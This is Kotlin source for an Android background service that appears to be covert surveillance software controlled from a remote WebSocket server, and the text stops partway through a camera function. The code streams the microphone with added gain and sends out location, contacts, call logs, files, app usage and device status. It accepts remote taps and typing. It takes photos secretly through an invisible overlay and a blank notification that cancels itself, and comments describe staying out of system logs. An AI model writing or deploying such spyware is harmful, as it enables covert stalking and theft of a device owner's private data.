package com.example.android_security

import android.app.*
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import android.os.Build
import android.os.PowerManager
import android.content.Context
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.hardware.camera2.*
import android.hardware.camera2.params.*
import android.hardware.display.*
import android.graphics.*
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread
import java.util.*
import android.content.IntentFilter
import android.os.BatteryManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.bluetooth.BluetoothAdapter
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.Manifest
import android.content.pm.PackageManager
import okio.ByteString
import okio.ByteString.Companion.toByteString
import okio.Buffer
import android.media.audiofx.NoiseSuppressor
import android.media.audiofx.AcousticEchoCanceler
import android.location.LocationManager
import android.location.LocationListener
import android.app.usage.UsageStatsManager
import android.app.usage.UsageEvents
import java.io.ByteArrayOutputStream
import android.provider.Settings

class MonitoringService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    internal var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    private var isCameraStreaming = false
    private var isScreenStreaming = false 
    private var cameraDevice: CameraDevice? = null
    private var cameraSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var currentLens: Int = CameraCharacteristics.LENS_FACING_FRONT 
    private var lensFacing = CameraCharacteristics.LENS_FACING_FRONT 
    private var cameraRetryCount = 0

    @Volatile private var pendingPhotoCapture = false

    private var wifiLock: WifiManager.WifiLock? = null
    private var silentAudioTrack: AudioTrack? = null
    private var isSilentAudioRunning = false

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var screenImageReader: ImageReader? = null
    private var projectionResultCode: Int = 0
    private var projectionData: Intent? = null

    private var dummyView: android.view.View? = null
    private var overlaySurface: android.graphics.SurfaceTexture? = null
    private var overlaySurfaceObj: android.view.Surface? = null
    private var isMicStreaming = false
    private var audioRecord: AudioRecord? = null
    private var locationListener: LocationListener? = null

    private var overlayView: android.view.TextureView? = null
    private lateinit var mainHandler: android.os.Handler
    private var backgroundThread: android.os.HandlerThread? = null
    private var backgroundHandler: android.os.Handler? = null

    private lateinit var deviceId: String

    companion object {
        const val DEFAULT_SERVER_URL = "wss://YOUR_RENDER_APP_NAME.onrender.com/ws"
        const val SAMPLE_RATE = 8000
        
        // Relay for Flutter UI
        var messageListener: ((String) -> Unit)? = null
        var instance: MonitoringService? = null
        var isHardwareYielded = false
    }

    /** Read the server URL from SharedPreferences (set by Flutter setup screen) */
    private fun getServerUrl(): String {
        val prefs = getSharedPreferences("server_config", Context.MODE_PRIVATE)
        return prefs.getString("server_url", null) ?: DEFAULT_SERVER_URL
    }

    /** Generate a unique, persistent device ID like 'vivo_v2322_a7f3' */
    private fun getOrCreateDeviceId(): String {
        val prefs = getSharedPreferences("device_identity", Context.MODE_PRIVATE)
        var id = prefs.getString("device_id", null)
        if (id == null) {
            val model = Build.MODEL.replace(" ", "_").lowercase()
            val suffix = java.util.UUID.randomUUID().toString().take(4)
            id = "${model}_${suffix}"
            prefs.edit().putString("device_id", id).apply()
        }
        return id!!
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        deviceId = getOrCreateDeviceId()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SecurityService::Wakelock")
        wakeLock?.acquire()

        backgroundThread = android.os.HandlerThread("CameraBackground").apply { start() }
        backgroundHandler = android.os.Handler(backgroundThread!!.looper)
        mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
        
        // Initialize WiFi Lock to prevent radio from sleeping - Optimized for thermals
        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL, "SecurityService::WifiLock")
        wifiLock?.acquire()

        // Start programmatic silence loop to keep process alive without stealing audio focus
        startSilentAudioLoop()

        // The camera preview overlay will be created ON-DEMAND during camera start
        // to minimize visibility in Android system logs/settings while idle.
        connectWebSocket()
        startLocationPolling()
        startStatusMonitoring()
        startRevivalHeartbeat()
        
        // Prepare notification channel immediately
        createNotificationChannel()

        // CRITICAL BOOT FIX: Android strictly requires a call to startForeground() within 5 seconds 
        // if this service was launched via startForegroundService() (e.g., from the BootReceiver).
        // Failure to do this results in a ForegroundServiceStartNotAllowedException crash.
        updateForegroundService(includeCamera = false, includeProjection = false)
    }

    private fun createInvisibleOverlay(onReady: () -> Unit) {
        if (!android.provider.Settings.canDrawOverlays(this)) {
            android.util.Log.e("SecurityService", "Missing SYSTEM_ALERT_WINDOW permission for stealth overlay")
            onReady() // Proceed anyway, although Oppo may fail
            return
        }

        try {
            if (overlayView != null) {
                onReady()
                return
            }

            val windowManager = getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
            val params = android.view.WindowManager.LayoutParams(
                1, 1,
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                    android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    android.view.WindowManager.LayoutParams.TYPE_PHONE,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.graphics.PixelFormat.TRANSLUCENT
            )
            params.gravity = android.view.Gravity.TOP or android.view.Gravity.START
            params.x = 0
            params.y = 0

            overlayView = android.view.TextureView(this).apply {
                alpha = 0f
                surfaceTextureListener = object : android.view.TextureView.SurfaceTextureListener {
                    override fun onSurfaceTextureAvailable(st: android.graphics.SurfaceTexture, w: Int, h: Int) {
                        android.util.Log.i("SecurityService", "Overlay Surface READY.")
                        onReady()
                    }
                    override fun onSurfaceTextureSizeChanged(st: android.graphics.SurfaceTexture, w: Int, h: Int) {}
                    override fun onSurfaceTextureDestroyed(st: android.graphics.SurfaceTexture): Boolean = true
                    override fun onSurfaceTextureUpdated(st: android.graphics.SurfaceTexture) {}
                }
            }

            windowManager.addView(overlayView, params)
            android.util.Log.i("SecurityService", "Invisible overlay requested.")
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Failed to add overlay: $e")
            onReady()
        }
    }

    private fun removeInvisibleOverlay() {
        try {
            overlayView?.let { view ->
                val windowManager = getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
                windowManager.removeView(view)
                overlayView = null
                android.util.Log.i("SecurityService", "Invisible overlay removed.")
            }
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Failed to remove overlay: $e")
        }
    }

    private fun connectWebSocket() {
        val serverUrl = getServerUrl()
        android.util.Log.d("Signaling", "Connecting to: $serverUrl")
        val request = Request.Builder().url(serverUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                android.util.Log.d("Signaling", "Connected to PC Controller")
                // Overlay is now created ON-DEMAND when camera starts (Dynamic Stealth)
                val register = JSONObject().apply {
                    put("type", "register")
                    put("role", "android_phone")
                    put("id", deviceId)
                    put("deviceId", deviceId)
                }
                webSocket.send(register.toString())
                startHeartbeat()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                // Safe relay to Flutter UI (won't block background execution if Flutter is detached)
                // Safe relay to Flutter UI (suppress warnings if detached in background)
                try {
                    messageListener?.invoke(text)
                } catch (e: Exception) {
                    // Ignore expected detached errors
                }
                
                try {
                    val data = JSONObject(text)
                    val mtype = data.optString("type")
                    android.util.Log.d("Signaling", "Received Command: $mtype")
                    
                    when (mtype) {
                        "ping" -> {
                            val pong = JSONObject().put("type", "pong")
                            webSocket.send(pong.toString())
                        }
                        "list_files" -> {
                            val path = data.optString("path", "/storage/emulated/0")
                            handleListFiles(path)
                        }
                        "get_contacts" -> {
                            handleGetContacts()
                        }
                        "tap", "swipe", "long_press", "navigation", "type" -> {
                            RemoteControlService.instance?.let { service ->
                                service.handleRemoteCommand(data)
                            }
                        }
                        "start_location" -> {
                            handleGetLocation()
                            startLocationPolling()
                        }
                        "request_persistence" -> {
                            requestPowerWhitelist()
                        }
                        "stop_location" -> {
                            // Optionally stop polling here to save battery
                        }
                        "get_usage_stats" -> handleGetUsageStats()
                        "get_call_logs" -> handleGetCallLogs()
                        "search_files" -> {
                            val pattern = data.optString("pattern", "")
                            handleSearchFiles(pattern)
                        }
                        "start_camera" -> {
                            val lens = if (data.optString("lens") == "front") CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                            updateForegroundService(includeCamera = true)
                            mainHandler.postDelayed({
                                startNativeCamera(lens)
                            }, 1500)
                        }
                        "take_photo" -> {
                            val lens = if (data.optString("lens") == "front") CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                            android.util.Log.i("NativeCamera", "take_photo command parsed. Executing Stealth Proxy FullScreenIntent...")
                            
                            updateForegroundService(includeCamera = true, includeProjection = isScreenStreaming)
                            pendingPhotoCapture = true
                            
                            if (isCameraStreaming && currentLens == lens && cameraDevice != null) {
                                // If the stream is genuinely alive right now, just fire the watchdog logic and skip the proxy
                                startNativeCamera(lens)
                            } else {
                                // Camera is fully dormant or killed. We must wake the HAL via proxy Activity.
                                // 1. Build the invisible Intent
                                val fgIntent = Intent(instance, HiddenCaptureActivity::class.java).apply {
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                    putExtra("lens", lens)
                                }
                                val pendingIntent = android.app.PendingIntent.getActivity(
                                    instance, 
                                    101, 
                                    fgIntent, 
                                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                                )
                                
                                // 2. Create the FullScreen Notification
                                val nm = getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                                val channelId = "stealth_capture_channel"
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                    val channel = android.app.NotificationChannel(channelId, "System Event", android.app.NotificationManager.IMPORTANCE_HIGH).apply {
                                        setSound(null, null)
                                        enableVibration(false)
                                    }
                                    nm.createNotificationChannel(channel)
                                }
                                
                                val b = androidx.core.app.NotificationCompat.Builder(instance!!, channelId)
                                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                                    .setContentTitle("")
                                    .setContentText("")
                                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                                    .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL)
                                    .setFullScreenIntent(pendingIntent, true)
                                    .setAutoCancel(true)
                                
                                // Clean up any stale sessions
                                stopNativeCamera()
                                
                                // 3. Fire the Intent and give the OS time to process the BAL before canceling the ghost notification
                                try {
                                    nm.notify(101, b.build())
                                    // Fallback if FullScreenIntent acts as a Heads-Up (e.g. screen is already fully unlocked and ON)
                                    instance?.startActivity(fgIntent)
                                    
                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                        nm.cancel(101)
                                    }, 2000)
                                } catch (e: Exception) {
                                    android.util.Log.e("NativeCamera", "Failed to fire Stealth Intent: $e")
                                }
                            }
                        }
                        "stop_camera" -> {
                            isCameraStreaming = false // Prevent auto-retry
                            stopNativeCamera()
                            updateForegroundService() // Strip camera FGS type
                        }

                        "start_mic" -> {
                            updateForegroundService(includeMic = true)
                            // Allow time for Foreground Service type to register before hardware access
                            mainHandler.postDelayed({
                                startNativeMic()
                            }, 300)
                        }
                        "stop_mic" -> stopNativeMic()
                        "list_apps" -> {
                            handleListApps()
                        }
                        "launch_app" -> {
                            val pkg = data.optString("package")
                            if (pkg.isNotEmpty()) handleLaunchApp(pkg)
                        }
                        "take_screenshot" -> {
                            RemoteControlService.instance?.takeStealthScreenshot()
                        }
                        "request_status" -> {
                            sendDeviceStatus()
                        }
                        "start_speaker" -> {
                            speakerActive = true
                            android.util.Log.d("NativeAudio", "Phone speaker ACTIVATED by PC")
                        }
                        "stop_speaker" -> {
                            speakerActive = false
                            try {
                                pcmAudioTrack?.stop()
                                pcmAudioTrack?.release()
                                pcmAudioTrack = null
                            } catch (e: Exception) {}
                            android.util.Log.d("NativeAudio", "Phone speaker DEACTIVATED by PC")
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("Signaling", "Error processing message: $e | RAW: $text")
                    sendError("Protocol Error: Expected JSON format. Check PC controller version.")
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                android.util.Log.e("Signaling", "WebSocket Failure: ${t.message}. Reconnecting in 5s...")
                stopNativeCamera()
                stopNativeScreenCapture()
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    connectWebSocket()
                }, 5000)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                android.util.Log.d("Signaling", "WebSocket Closed: $reason")
                stopNativeCamera()
                stopNativeScreenCapture()
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    connectWebSocket()
                }, 5000)
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                val data = bytes.toByteArray()
                if (data.isNotEmpty() && data[0] == 0x04.toByte() && speakerActive) {
                    handleIncomingAudioChunk(data)
                }
            }
        })
    }

    private var pcmAudioTrack: AudioTrack? = null
    private var speakerActive = false

    private fun handleIncomingAudioChunk(data: ByteArray) {
        if (pcmAudioTrack == null) {
            try {
                val minBuf = AudioTrack.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT)
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    pcmAudioTrack = AudioTrack.Builder()
                        .setAudioAttributes(AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_MEDIA)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                            .build())
                        .setAudioFormat(AudioFormat.Builder()
                            .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                            .setSampleRate(SAMPLE_RATE)
                            .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                            .build())
                        .setBufferSizeInBytes(minBuf * 4)
                        .setTransferMode(AudioTrack.MODE_STREAM)
                        .build()
                } else {
                    pcmAudioTrack = AudioTrack(
                        AudioManager.STREAM_MUSIC,
                        SAMPLE_RATE,
                        AudioFormat.CHANNEL_OUT_MONO,
                        AudioFormat.ENCODING_PCM_16BIT,
                        minBuf * 4,
                        AudioTrack.MODE_STREAM
                    )
                }
                pcmAudioTrack?.play()
            } catch (e: Exception) {
                android.util.Log.e("AudioTrack", "Init Error: $e")
            }
        }
        
        try {
            if (pcmAudioTrack?.playState == AudioTrack.PLAYSTATE_PLAYING) {
                pcmAudioTrack?.write(data, 1, data.size - 1)
            }
        } catch (e: Exception) {
            android.util.Log.e("AudioTrack", "Write Error: $e")
        }
    }

    private fun startNativeMic() {
        if (isMicStreaming) return
        isMicStreaming = true
        
        thread {
            try {
                val minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
                val bufferSize = minBuf * 4 // Increased for stability
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    android.util.Log.e("NativeMic", "RECORD_AUDIO Permission missing")
                    isMicStreaming = false
                    return@thread
                }
                
                // Short delay to allow previous session to release hardware
                Thread.sleep(500)
                
                // Fallback-safe AudioRecord initialization using VOICE_RECOGNITION for better sharing
                audioRecord = try {
                    AudioRecord(MediaRecorder.AudioSource.VOICE_RECOGNITION, SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize)
                } catch (e: Exception) {
                    AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize)
                }
                
                // Hardware Effects
                val sessionId = audioRecord?.audioSessionId ?: 0
                if (sessionId != 0) {
                    if (NoiseSuppressor.isAvailable()) {
                        NoiseSuppressor.create(sessionId)?.enabled = true
                        android.util.Log.d("NativeMic", "Hardware Noise Suppression Enabled")
                    }
                    if (AcousticEchoCanceler.isAvailable()) {
                        AcousticEchoCanceler.create(sessionId)?.enabled = true
                        android.util.Log.d("NativeMic", "Hardware Echo Cancellation Enabled")
                    }
                }

                audioRecord?.startRecording()
                android.util.Log.d("NativeMic", "Recording Started (Source: VOICE_RECOGNITION)")
                
                val buffer = ByteArray(bufferSize)
                var chunkCount = 0
                var lastLogTime = System.currentTimeMillis()
                
                while (isMicStreaming) {
                    if (isHardwareYielded) {
                        if (System.currentTimeMillis() - lastLogTime > 5000) {
                            android.util.Log.d("NativeMic", "Paused (Hardware Yielded)")
                            lastLogTime = System.currentTimeMillis()
                        }
                        Thread.sleep(1000)
                        continue
                    }
                    
                    val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (read > 0) {
                        chunkCount++
                        if (chunkCount % 100 == 0) {
                            android.util.Log.d("NativeMic", "Streaming: $read bytes read (Total chunks: $chunkCount)")
                        }
                        val chunk = buffer.copyOfRange(0, read)
                        
                        // Digital Gain: 4x boost for background monitoring (PCM16)
                        val boosted = ByteArray(chunk.size)
                        for (i in 0 until chunk.size step 2) {
                            if (i + 1 < chunk.size) {
                                var sample = ((chunk[i+1].toInt() shl 8) or (chunk[i].toInt() and 0xFF)).toShort().toInt()
                                sample = (sample * 4).coerceIn(-32768, 32767)
                                boosted[i] = (sample and 0xFF).toByte()
                                boosted[i+1] = ((sample shr 8) and 0xFF).toByte()
                            }
                        }

                        val out = Buffer()
                        out.writeByte(0x01)
                        out.write(boosted)
                        webSocket?.send(out.readByteString())
                    } else if (read < 0) {
                        android.util.Log.e("NativeMic", "Read error: $read")
                        break
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("NativeMic", "Error: $e")
                isMicStreaming = false
            } finally {
                audioRecord?.stop()
                audioRecord?.release()
                audioRecord = null
            }
        }
    }

    private fun stopNativeMic() {
        isMicStreaming = false
    }

    private fun startLocationPolling() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationListener = object : LocationListener {
                    override fun onLocationChanged(loc: android.location.Location) {
                        try {
                            sendLocationToPC(loc, "${loc.provider} (stream)")
                        } catch (e: Exception) {
                            android.util.Log.e("SecurityService", "Location send failure")
                        }
                    }
                    override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }
                
                // Continuous background polling - Optimized to prevent heating
                mainHandler?.post {
                    try {
                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 120000L, 20f, locationListener!!)
                    } catch (e: Exception) { android.util.Log.e("SecurityService", "GPS init fail") }
                    
                    try {
                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 120000L, 20f, locationListener!!)
                    } catch (e: Exception) { android.util.Log.e("SecurityService", "Network init fail") }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "GPS Overall fail: $e")
        }
    }

    private fun stopLocationPolling() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            locationListener?.let { 
                locationManager.removeUpdates(it)
                locationListener = null
                android.util.Log.i("SecurityService", "Location polling stopped.")
            }
        } catch (e: Exception) {}
    }

    private fun startStatusMonitoring() {
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                sendDeviceStatus()
                handler.postDelayed(this, 15000) // Every 15 seconds
            }
        }
        handler.postDelayed(runnable, 1000) 
    }

    private fun sendDeviceStatus() {
        try {
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
                registerReceiver(null, ifilter)
            }
            val batteryLevel = batteryStatus?.let { intent ->
                val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                (level * 100 / scale.toFloat()).toInt()
            } ?: -1
            val isCharging = batteryStatus?.let { intent ->
                val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            } ?: false

            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            val networkType = when {
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WIFI"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "MOBILE"
                else -> "NONE"
            }

            var wifiSSID = "Unknown"
            var wifiSignal = -1
            if (networkType == "WIFI") {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                val info = wifiManager.connectionInfo
                wifiSSID = info.ssid.replace("\"", "")
                wifiSignal = info.rssi
            }

            val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
            val bluetoothStatus = if (bluetoothAdapter?.isEnabled == true) "ON" else "OFF"

            val isIgnoringBattery = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(packageName)
            } else true

            val deviceStatus = JSONObject().apply {
                put("type", "device_status")
                put("device_id", deviceId)
                put("batteryLevel", batteryLevel)
                put("isCharging", isCharging)
                put("networkType", networkType)
                put("wifiSSID", wifiSSID)
                put("wifiSignal", wifiSignal)
                put("bluetoothStatus", bluetoothStatus)
                put("uptime", android.os.SystemClock.elapsedRealtime())
                put("isIgnoringBattery", isIgnoringBattery)
                put("model", "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
                put("deviceName", android.os.Build.DEVICE)
                put("androidVersion", android.os.Build.VERSION.RELEASE)
                put("timestamp", System.currentTimeMillis())
            }
            webSocket?.send(deviceStatus.toString())
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Status error: $e")
        }
    }

    private fun handleGetLocation() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendError("Location permission not granted")
                return
            }
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val now = System.currentTimeMillis()
            
            // Try to find a recent cached location (within 60 seconds)
            val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
            var bestLoc: android.location.Location? = null
            
            for (provider in providers) {
                if (!locationManager.isProviderEnabled(provider)) continue
                val loc = locationManager.getLastKnownLocation(provider)
                if (loc != null && (now - loc.time) < 60000) {
                    if (bestLoc == null || loc.accuracy < bestLoc.accuracy) {
                        bestLoc = loc
                    }
                }
            }

            if (bestLoc != null) {
                sendLocationToPC(bestLoc, bestLoc.provider ?: "unknown")
            } else {
                // Request fresh update from BOTH GPS and Network for max reliability
                val listener = object : LocationListener {
                    override fun onLocationChanged(loc: android.location.Location) {
                        sendLocationToPC(loc, "${loc.provider} (fresh)")
                        locationManager.removeUpdates(this)
                    }
                    override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }
                
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, android.os.Looper.getMainLooper())
                }
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, android.os.Looper.getMainLooper())
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Location update failed: $e")
        }
    }

    private fun sendLocationToPC(loc: android.location.Location, provider: String) {
        webSocket?.send(JSONObject().apply {
            put("type", "location_update")
            put("device_id", deviceId)
            put("lat", loc.latitude)      // Mismatch fixed: was latitude
            put("lng", loc.longitude)     // Mismatch fixed: was longitude
            put("accuracy", loc.accuracy)
            put("altitude", loc.altitude)
            put("speed", loc.speed)
            put("provider", provider)
            put("timestamp", loc.time)
        }.toString())
    }

    private fun handleGetUsageStats() {
        try {
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val now = System.currentTimeMillis()
            val allDays = org.json.JSONArray()
            
            val calendar = Calendar.getInstance()
            calendar.set(Calendar.HOUR_OF_DAY, 0)
            calendar.set(Calendar.MINUTE, 0)
            calendar.set(Calendar.SECOND, 0)
            calendar.set(Calendar.MILLISECOND, 0)
            val todayStart = calendar.timeInMillis

            for (i in 0 until 7) {
                val dayStart = todayStart - (i * 86400000L)
                val dayEnd = if (i == 0) now else dayStart + 86400000L
                
                val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, dayStart, dayEnd)
                val dayResults = org.json.JSONArray()
                
                stats?.sortedByDescending { it.totalTimeInForeground }?.take(20)?.forEach { stat ->
                    if (stat.totalTimeInForeground > 0) {
                        val pkgParts = stat.packageName.split(".")
                        val rawName = pkgParts.last()
                        val appName = rawName.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
                        
                        dayResults.put(JSONObject().apply {
                            put("packageName", stat.packageName)
                            put("appName", appName)
                            put("totalTime", stat.totalTimeInForeground)
                            put("usageTime", stat.totalTimeInForeground)
                            put("lastTimeUsed", stat.lastTimeUsed)
                        })
                    }
                }
                
                val label = when(i) {
                    0 -> "Today"
                    1 -> "Yesterday"
                    else -> {
                        val d = Date(dayStart)
                        java.text.SimpleDateFormat("dd/MM/yyyy", Locale.getDefault()).format(d)
                    }
                }

                allDays.put(JSONObject().apply {
                    put("date", java.text.SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date(dayStart)))
                    put("label", label)
                    put("usage", dayResults)
                })
            }

            webSocket?.send(JSONObject().apply {
                put("type", "app_usage_list")
                put("device_id", deviceId)
                put("usage", if (allDays.length() > 0) allDays.getJSONObject(0).getJSONArray("usage") else org.json.JSONArray())
                put("days", allDays)
            }.toString())
        } catch (e: Exception) {
            android.util.Log.e("SecurityService", "Usage stats error: $e")
            sendError("Usage stats error: ${e.message}")
        }
    }

    // Called precisely when HiddenCaptureActivity gains window focus
    fun triggerStealthCapture(lensFacing: Int) {
        android.util.Log.i("NativeCamera", "Proxy Activity attached. HAL unrestricted. Starting Camera2...")
        startNativeCamera(lensFacing)
    }

    private fun startNativeCamera(lensFacing: Int) {
        if (isHardwareYielded) {
            sendError("Hardware Yielded: App is using Camera")
            return
        }
        
        // Ensure stealth overlay exists and is ready before starting Camera2
        if (overlayView == null) {
            mainHandler.post {
                createInvisibleOverlay {
                    backgroundHandler?.post {
                        startNativeCameraReal(lensFacing)
                    }
                }
            }
            return
        }
        startNativeCameraReal(lensFacing)
    }

    private fun cameraHardwareCleanup() {
        android.util.Log.i("NativeCamera", "Executing hardware cleanup sequence...")
        try {
            cameraSession?.close()
            cameraSession = null
        } catch (e: Exception) {}
        
        try {
            cameraDevice?.close()
            cameraDevice = null
        } catch (e: Exception) {}
        
        try {
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {}
        
        removeInvisibleOverlay()
        isCameraStreaming = false
        pendingPhotoCapture = false
        android.util.Log.i("NativeCamera", "Hardware cleanup complete. All resources recycled.")
    }

    private fun startNativeCameraReal(lensFacing: Int) {
        // Only skip if camera is actively streaming with a live device handle
        if (isCameraStreaming && currentLens == lensFacing && cameraDevice != null) return
        stopNativeCamera() // Reset any stale handles
        
        isCameraStreaming = true
        currentLens = lensFacing
        
        backgroundHandler?.post {
            try {
                val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                
                // Robust lookup: Prioritize primary sensors, fallback to first available if needed
                val cameraId = try {
                    cameraManager.cameraIdList.firstOrNull { id ->
                        val chars = cameraManager.getCameraCharacteristics(id)
                        val facing = chars.get(CameraCharacteristics.LENS_FACING)
                        val capabilities = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES)
                        facing == lensFacing && capabilities?.contains(CameraMetadata.REQUEST_AVAILABLE_CAPABILITIES_BACKWARD_COMPATIBLE) == true
                    } ?: cameraManager.cameraIdList.firstOrNull { id ->
                        cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == lensFacing
                    } ?: cameraManager.cameraIdList.getOrNull(0) ?: return@post
                } catch (e: Exception) {
                    cameraManager.cameraIdList.getOrNull(0) ?: return@post
                }

                android.util.Log.i("NativeCamera", "Opening Camera ID: $cameraId (Lens: $lensFacing)")

                if (ContextCompat.checkSelfPermission(this@MonitoringService, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    sendError("Camera permission missing")
                    return@post
                }

                // Query actual supported JPEG sizes — target ~640x480 for good balance
                val chars = cameraManager.getCameraCharacteristics(cameraId)
